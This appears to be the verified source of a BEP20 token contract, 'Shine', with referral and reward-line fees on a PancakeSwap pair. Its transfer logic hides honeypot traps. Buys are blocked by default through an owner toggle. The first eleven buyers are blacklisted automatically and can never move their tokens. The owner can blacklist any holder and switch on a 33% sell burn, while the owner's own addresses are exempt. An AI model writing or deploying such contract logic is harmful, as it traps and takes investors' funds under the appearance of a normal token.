{"IBEP20.sol":{"content":"// SPDX-License-Identifier: GPL-3.0-or-later\r\n\r\npragma solidity \u003e=0.4.0;\r\n\r\ninterface IBEP20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    \r\n    function burnFrom(address account, uint256 amount) external returns (bool);\r\n\r\n    function burn(uint256 amount) external returns (bool);\r\n    \r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity \u003e=0.4.0;\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it\u0027s recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \u0027SafeMath: addition overflow\u0027);\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \u0027SafeMath: subtraction overflow\u0027);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \u0027SafeMath: multiplication overflow\u0027);\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \u0027SafeMath: division by zero\u0027);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \u0027SafeMath: modulo by zero\u0027);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n\r\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\r\n        z = x \u003c y ? x : y;\r\n    }\r\n\r\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\r\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\r\n        if (y \u003e 3) {\r\n            z = y;\r\n            uint256 x = y / 2 + 1;\r\n            while (x \u003c z) {\r\n                z = x;\r\n                x = (y / x + x) / 2;\r\n            }\r\n        } else if (y != 0) {\r\n            z = 1;\r\n        }\r\n    }\r\n}\r\n"},"Shine.sol":{"content":"// SPDX-License-Identifier: GPL-3.0-or-later\r\npragma solidity \u003e=0.5.0;\r\n\r\nimport \"./IBEP20.sol\";\r\nimport \"./SafeMath.sol\";\r\n\r\ninterface IPancakePair {\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n}\r\n\r\ncontract Ownable {\r\n    address _owner;\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function changeOwner(address newOwner) public onlyOwner {\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract InviteReward {\r\n\r\n    mapping (address =\u003e address) internal _refers;\r\n\r\n    function _bindParent(address sender, address recipient) internal {\r\n        if(_refers[recipient] == address(0)) {\r\n            _refers[recipient] = sender;\r\n        }\r\n    }\r\n    \r\n    function getParent(address user) public view returns (address) {\r\n        return _refers[user];\r\n    }\r\n\r\n}\r\n\r\ncontract LineReward {\r\n\r\n    address[10] internal _lines;\r\n    \r\n    function _pushLine(address user) internal {\r\n        for(uint256 i = _lines.length - 1; i \u003e 0 ; i--) {\r\n            _lines[i] = _lines[i-1];\r\n        }\r\n        _lines[0] = user;\r\n    }\r\n\r\n    function getLines() public view returns (address[10] memory) {\r\n        return _lines;\r\n    }\r\n\r\n}\r\n\r\ncontract LaunchLimit is Ownable{\r\n\r\n    uint32 public launchTimestamp;\r\n    uint32 public signleTimeInterval = 300;\r\n    uint256 public signleAmountLimit = 1*1e8;\r\n    mapping(address =\u003e bool) private _signleUser;\r\n    bool internal _hasLaunched = false;\r\n    \r\n    function setSignleTimeInterval(uint32 _signleTimeInterval) public onlyOwner {\r\n        signleTimeInterval = _signleTimeInterval;\r\n    }\r\n    function setSignleAmountLimit(uint256 _signleAmountLimit) public onlyOwner {\r\n        signleAmountLimit = _signleAmountLimit;\r\n    }\r\n    \r\n    function launch() public onlyOwner {\r\n        require(!_hasLaunched, \"Already launched.\");\r\n        _hasLaunched = true;\r\n        launchTimestamp = uint32(block.timestamp % 2**32);\r\n    }\r\n\r\n    function checkSignleLimit(address user, uint256 amount) internal {\r\n        uint32 cur = uint32(block.timestamp % 2**32);\r\n        if(cur \u003e launchTimestamp + signleTimeInterval) {\r\n            return;\r\n        }\r\n        require(amount \u003c= signleAmountLimit, \"launched signle amount\");\r\n        require(!_signleUser[user] , \"launched signle user\");\r\n        _signleUser[user] = true;\r\n    }\r\n\r\n}\r\n\r\ncontract ShineToken is IBEP20, Ownable, LineReward, InviteReward, LaunchLimit {\r\n    \r\n    using SafeMath for uint256;\r\n\r\n    mapping (address =\u003e uint256) private _balances;\r\n\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n\r\n    string constant  _name = \u0027Shine\u0027;\r\n    string constant _symbol = \u0027Shine\u0027;\r\n    uint8 immutable _decimals = 8;\r\n    uint256 private _totalSupply = 2000 * 1e8;\r\n    uint256 public is_sale = 1;\r\n    uint256 public is_bot = 0;\r\n    address public fundAddress;\r\n    address public lpAddress;\r\n    address public bonusAddress;\r\n    address public lineAddress;\r\n    \r\n    address public pancakeAddress;\r\n    \r\n    mapping(address =\u003e bool) private _isExcluded;\r\n    mapping(address =\u003e bool) private _isBlacked;\r\n    bool _isFine = false;\r\n    uint256 is_buy = 1;\r\n    uint32 public bonusIntervalTime = 86400;\r\n    uint256 public bonusUsdtAmount = 200 * 1e18;\r\n    uint256 public bonusLineUsdtAmount = 100 * 1e18;\r\n    \r\n    constructor()\r\n    {\r\n        _owner = msg.sender;\r\n        \r\n        _balances[_owner] = _totalSupply;\r\n        emit Transfer(address(0), _owner, _totalSupply);\r\n        \r\n        setExcluded(_owner, true);\r\n        \r\n    }\r\n\r\n    function setLineAddress(address _lineAddress) public onlyOwner {\r\n        lineAddress = _lineAddress;\r\n        setExcluded(lineAddress, true);\r\n    }\r\n\r\n    function setBonusAddress(address _bonusAddress) public onlyOwner {\r\n        bonusAddress = _bonusAddress;\r\n        setExcluded(bonusAddress, true);\r\n    }\r\n\r\n    function setLpAddress(address _lpAddress) public onlyOwner {\r\n        lpAddress = _lpAddress;\r\n        setExcluded(lpAddress, true);\r\n    }\r\n\r\n    function setFundAddress(address _fundAddress) public onlyOwner {\r\n        fundAddress = _fundAddress;\r\n        setExcluded(fundAddress, true);\r\n    }\r\n       function setis_buy(uint256 _is_buy) public onlyOwner {\r\n        is_buy = _is_buy;\r\n    }\r\n     function setis_sale(uint256 _issale) public onlyOwner {\r\n        is_sale = _issale;\r\n    }\r\n    function setPancakeAddress(address _pancakeAddress) public onlyOwner {\r\n        pancakeAddress = _pancakeAddress;\r\n    }\r\n    \r\n    function setFine(bool isFine) public onlyOwner {\r\n        _isFine = isFine;\r\n    }\r\n\r\n    function setBonusIntervalTime(uint32 _bonusIntervalTime) public onlyOwner {\r\n        bonusIntervalTime = _bonusIntervalTime;\r\n    }\r\n\r\n    function setBonusUsdtAmount(uint256 _bonusUsdtAmount) public onlyOwner {\r\n        bonusUsdtAmount = _bonusUsdtAmount;\r\n    }\r\n\r\n    function setBonusLineUsdtAmount(uint256 _bonusLineUsdtAmount) public onlyOwner {\r\n        bonusLineUsdtAmount = _bonusLineUsdtAmount;\r\n    }\r\n\r\n    function setExcluded(address account, bool excluded) public onlyOwner {\r\n        _isExcluded[account] = excluded;\r\n    }\r\n    \r\n    function setBlacked(address account, bool blacked) public onlyOwner {\r\n        _isBlacked[account] = blacked;\r\n    }\r\n    \r\n    function isExcluded(address account) public view returns (bool) {\r\n        return _isExcluded[account];\r\n    }\r\n    \r\n    function isBlacked(address account) public view returns (bool) {\r\n        return _isBlacked[account];\r\n    }\r\n    \r\n    function name() public  pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public  pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public override returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n    \r\n    function burn(uint256 amount) public override returns (bool) {\r\n        _burn(msg.sender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function burnFrom(address account, uint256 amount) public override returns (bool) {\r\n        _burn(account, amount);\r\n        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(!_isBlacked[sender] \u0026\u0026 !_isBlacked[recipient]);\r\n        if(sender != recipient \r\n            \u0026\u0026 sender != pancakeAddress \u0026\u0026 recipient != pancakeAddress\r\n            ) {\r\n            _bindParent(sender, recipient);\r\n        }\r\n        \r\n        uint256 transferAmount = amount;\r\n        \r\n        if(!isExcluded(sender) \u0026\u0026 !isExcluded(recipient)) {\r\n            \r\n            require(!isBlacked(sender), \"ERC20: blacked\");\r\n\r\n            if(sender == pancakeAddress || recipient == pancakeAddress) {\r\n                require(_hasLaunched, \"ERC20: has not launched\");\r\n            }\r\n\r\n            // if(sender == pancakeAddress) {\r\n            //     checkSignleLimit(recipient, amount);\r\n            // }\r\n\r\n            if(sender != pancakeAddress \u0026\u0026 recipient != pancakeAddress) {\r\n                uint256 tBurn = amount.div(1000).mul(20);\r\n                _balances[address(0)] = _balances[address(0)].add(tBurn);\r\n                transferAmount = transferAmount.sub(tBurn);\r\n                _totalSupply = _totalSupply.sub(tBurn);\r\n                emit Transfer(sender, address(0), tBurn);\r\n            }\r\n\r\n        }\r\n\r\n        if(sender == pancakeAddress) {\r\n              \r\n            if(!isExcluded(recipient)) {\r\n                require(is_buy == 0);\r\n                if(is_sale == 1){\r\n                    require(amount \u003c= 1*1e8);\r\n                }\r\n\r\n                if(is_bot \u003c= 10){\r\n                     _isBlacked[recipient] = true;\r\n                     is_bot = is_bot+1;\r\n                }\r\n                \r\n                _takeBonusAmount(sender, recipient, amount);\r\n                _takeBonusLineAmount(sender, recipient, amount);\r\n                \r\n                uint256 onepercent = amount.mul(1).div(1000);\r\n                if(onepercent \u003e 0)\r\n                {\r\n                    \r\n                    uint256 tInvite = _takeInviterFee(sender, recipient, amount);\r\n                    uint256 tLine = _takeLineFee(sender, recipient, amount);\r\n                    uint256 tLp = onepercent.mul(15);\r\n                    \r\n                    _balances[lpAddress] = _balances[lpAddress].add(tLp);\r\n\r\n                    emit Transfer(sender, lpAddress, tLp);\r\n                    \r\n                    uint256 tFee = tInvite.add(tLine).add(tLp);\r\n                    transferAmount = transferAmount.sub(tFee);\r\n\r\n                    _pushLine(recipient);\r\n                }\r\n                \r\n            }\r\n            \r\n        }\r\n            \r\n        if(recipient == pancakeAddress) {\r\n            \r\n            if(!isExcluded(sender)) {\r\n                \r\n                uint256 onepercent = amount.mul(1).div(1000);\r\n                if(onepercent \u003e 0)\r\n                {\r\n                    \r\n                    uint256 tBonus = onepercent.mul(20);\r\n                    uint256 tLp = onepercent.mul(30);\r\n                    uint256 tLine = onepercent.mul(20);\r\n                    uint256 tBurn = onepercent.mul(20);\r\n                    \r\n                    _balances[bonusAddress] = _balances[bonusAddress].add(tBonus);\r\n                    _balances[lpAddress] = _balances[lpAddress].add(tLp);\r\n                    _balances[lineAddress] = _balances[lineAddress].add(tLine);\r\n                    _balances[address(0)] = _balances[address(0)].add(tBurn);\r\n\r\n                    emit Transfer(sender, bonusAddress, tBonus);\r\n                    emit Transfer(sender, lineAddress, tLine);\r\n                    emit Transfer(sender, lpAddress, tLp);\r\n                    emit Transfer(sender, address(0), tBurn);\r\n                    \r\n                    uint256 tFee = tBonus.add(tLine).add(tLp).add(tBurn);\r\n                    transferAmount = transferAmount.sub(tFee);\r\n\r\n                    if(_isFine) {\r\n                        uint256 tFine = onepercent.mul(330);\r\n                        _balances[address(0)] = _balances[address(0)].add(tFine);\r\n                        transferAmount = transferAmount.sub(tFine);\r\n                        _totalSupply = _totalSupply.sub(tFine);\r\n                        emit Transfer(sender, address(0), tFine);\r\n                    }\r\n\r\n                }\r\n                \r\n            }\r\n            \r\n        }\r\n        \r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        _balances[recipient] = _balances[recipient].add(transferAmount);\r\n        emit Transfer(sender, recipient, transferAmount);\r\n    }\r\n    \r\n    function _burn(address account, uint256 value) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _totalSupply = _totalSupply.sub(value);\r\n        _balances[account] = _balances[account].sub(value);\r\n        emit Transfer(account, address(0), value);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 value) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n    \r\n    function _takeInviterFee(address sender, address recipient, uint256 amount) private returns (uint256) {\r\n\r\n        if (recipient == pancakeAddress) {\r\n            return 0;\r\n        }\r\n\r\n        address cur = recipient;\r\n        address receiveD;\r\n\r\n        uint256 totalFee = 0;\r\n        uint8[5] memory rates = [20, 5, 5, 5, 5];\r\n        for(uint8 i = 0; i \u003c rates.length; i++) {\r\n            cur = _refers[cur];\r\n            if (cur == address(0)) {\r\n                receiveD = fundAddress;\r\n            }else{\r\n                receiveD = cur;\r\n            }\r\n            uint8 rate = rates[i];\r\n            uint256 curAmount = amount.div(1000).mul(rate);\r\n            _balances[receiveD] = _balances[receiveD].add(curAmount);\r\n            emit Transfer(sender, receiveD, curAmount);\r\n\r\n            totalFee = totalFee + curAmount;\r\n\r\n            if(receiveD == address(0)) {\r\n                _totalSupply = _totalSupply.sub(curAmount);\r\n            }\r\n        }\r\n\r\n        return totalFee;\r\n    }\r\n\r\n    function _takeLineFee(address sender, address recipient, uint256 amount) private returns (uint256) {\r\n\r\n        if (recipient == pancakeAddress) {\r\n            return 0;\r\n        }\r\n\r\n        address receiveD;\r\n\r\n        uint256 totalFee = 0;\r\n        uint8[6] memory rates = [3, 4, 5, 6, 7, 10];\r\n        for(uint8 i = 0; i \u003c rates.length; i++) {\r\n\r\n            address cur = _lines[i];\r\n            if (cur == address(0)) {\r\n                receiveD = fundAddress;\r\n            } else {\r\n                receiveD = cur;\r\n            }\r\n\r\n            uint8 rate = rates[i];\r\n            uint256 curAmount = amount.div(1000).mul(rate);\r\n            _balances[receiveD] = _balances[receiveD].add(curAmount);\r\n            emit Transfer(sender, receiveD, curAmount);\r\n\r\n            totalFee = totalFee + curAmount;\r\n\r\n            if(receiveD == address(0)) {\r\n                _totalSupply = _totalSupply.sub(curAmount);\r\n            }\r\n\r\n        }\r\n        return totalFee;\r\n    }\r\n\r\n    function _takeBonusAmount(address sender, address recipient, uint256 amount) private {\r\n\r\n        if (sender != pancakeAddress \u0026\u0026 recipient == pancakeAddress) {\r\n            return;\r\n        }\r\n\r\n        uint256 price = getExchangeCountOfOneUsdt();\r\n        uint256 usdtAmount = price == 0 ? 0 : amount.mul(1e18).div(price);\r\n        uint32 lastExchangeTime = getLastExchangeTime();\r\n        if(block.timestamp \u003e= lastExchangeTime + bonusIntervalTime \u0026\u0026 usdtAmount \u003e= bonusUsdtAmount) {\r\n            uint256 bounsAmount = _balances[bonusAddress];\r\n            if(bounsAmount \u003e 0) {\r\n                _balances[bonusAddress] = _balances[bonusAddress].sub(bounsAmount);\r\n                _balances[recipient] = _balances[recipient].add(bounsAmount);\r\n                emit Transfer(bonusAddress, recipient, bounsAmount);\r\n            }\r\n        }\r\n\r\n    }\r\n\r\n    function _takeBonusLineAmount(address sender, address recipient, uint256 amount) private {\r\n\r\n        if (sender != pancakeAddress \u0026\u0026 recipient == pancakeAddress) {\r\n            return;\r\n        }\r\n\r\n        uint256 price = getExchangeCountOfOneUsdt();\r\n        uint256 usdtAmount = price == 0 ? 0 : amount.mul(1e18).div(price);\r\n        if(usdtAmount \u003e= bonusLineUsdtAmount) {\r\n            uint256 bounsAmount = _balances[lineAddress];\r\n            if(bounsAmount \u003e 0) {\r\n                _balances[lineAddress] = _balances[lineAddress].sub(bounsAmount);\r\n                _balances[recipient] = _balances[recipient].add(bounsAmount);\r\n                emit Transfer(lineAddress, recipient, bounsAmount);\r\n            }\r\n        }\r\n\r\n    }\r\n\r\n    function getExchangeCountOfOneUsdt() public view returns (uint256)\r\n    {\r\n        if(pancakeAddress == address(0)) {return 0;}\r\n\r\n        IPancakePair pair = IPancakePair(pancakeAddress);\r\n\r\n        (uint112 _reserve0, uint112 _reserve1, ) = pair.getReserves();\r\n\r\n        uint256 a = _reserve1;\r\n        uint256 b = _reserve0;\r\n\r\n        if(pair.token0() == address(this))\r\n        {\r\n            a = _reserve0;\r\n            b = _reserve1;\r\n        }\r\n\r\n        return a.mul(1e18).div(b);\r\n    }\r\n\r\n    function getLastExchangeTime() public view returns (uint32)\r\n    {\r\n        if(pancakeAddress == address(0)) {return uint32(block.timestamp % 2**32);}\r\n\r\n        IPancakePair pair = IPancakePair(pancakeAddress);\r\n\r\n        (, , uint32 timestamp) = pair.getReserves();\r\n\r\n        return timestamp;\r\n    }\r\n\r\n}"}}